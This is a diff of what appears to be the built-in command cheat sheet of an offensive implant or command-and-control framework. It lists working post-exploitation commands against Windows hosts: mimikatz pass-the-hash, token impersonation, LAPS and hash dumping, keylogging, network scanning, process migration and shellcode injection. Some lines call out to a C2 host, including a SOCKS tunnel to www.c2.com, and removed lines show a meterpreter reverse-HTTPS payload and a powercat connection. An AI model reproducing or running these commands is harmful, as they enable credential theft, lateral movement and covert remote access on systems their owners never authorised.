@@ -323,7 +323,6 @@ invoke-mimikatz -command '"privilege::debug"'
 invoke-mimikatz -command '"crypto::capi"'
 invoke-mimikatz -command '"crypto::certificates /export"'
 invoke-mimikatz -command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:c:\\temp\\run.bat"'
-invoke-mimikatz -computer 10.0.0.1 -command '"sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<hash> /run:c:\\temp\\run.bat"'
 invoke-tokenmanipulation | select-object domain, username, processid, iselevated, tokentype | ft -autosize | out-string
 invoke-tokenmanipulation -impersonateuser -username "domain\\user"
 get-lapspasswords
@@ -345,27 +344,23 @@ get-recentfiles
 cred-popper
 get-clipboard
 hashdump
-get-keystrokes
-get-keystrokedata
+get-keystrokes | get-keystrokedata
 arpscan -ipcidr 10.0.0.1/24
 portscan -ipaddress 10.0.0.1-50 -ports "1-65535" -maxqueriesps 10000 -delay 0
 ((new-object Net.Sockets.TcpClient).connect("10.0.0.1",445))
-get-netstat | %{"$($_.Protocol) $($_.LocalAddress):$($_.LocalPort) $($_.RemoteAddress):$($_.Re
-motePort) $($_.State) $($_.ProcessName)($($_.PID))"}
+get-netstat | %{"$($_.Protocol) $($_.LocalAddress):$($_.LocalPort) $($_.RemoteAddress):$($_.RemotePort) $($_.State) $($_.ProcessName)($($_.PID))"}
 1..254 | %{ try {[System.Net.Dns]::GetHostEntry("10.0.0.$_") } catch {} }|select hostname
 migrate
 migrate -procid 4444
 migrate -procpath c:\\windows\\system32\\searchprotocolhost.exe -suspended -RtlCreateUserThread
 migrate -procpath c:\\windows\\system32\\svchost.exe -suspended
 inject-shellcode -x86 -shellcode (gc c:\\temp\\shellcode.bin -encoding byte) -procid 5634
-invoke-shellcode -payload windows/meterpreter/reverse_https -lhost 172.16.0.100 -lport 443 -force
 get-eventlog -newest 10000 -instanceid 4624 -logname security | select message -expandproperty message | select-string -pattern "user1|user2|user3"
 send-mailmessage -to "itdept@test.com" -from "user01 <user01@example.com>" -subject <> -smtpserver <> -attachment <>
 sharpsocks -uri http://www.c2.com:9090 -beacon 2000 -insecure
 netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow program="C:\\windows\\system32\\svchost.exe" protocol=TCP localport=80 profile=Domain
 $socket = new-object System.Net.Sockets.TcpListener('0.0.0.0', 1080);$socket.start();
 reversedns 10.0.0.1
-powercat -c 172.0.0.1 -p 8080 -d
 [System.Net.Dns]::GetHostbyAddress("10.0.0.1")
 
 Implant Handler:
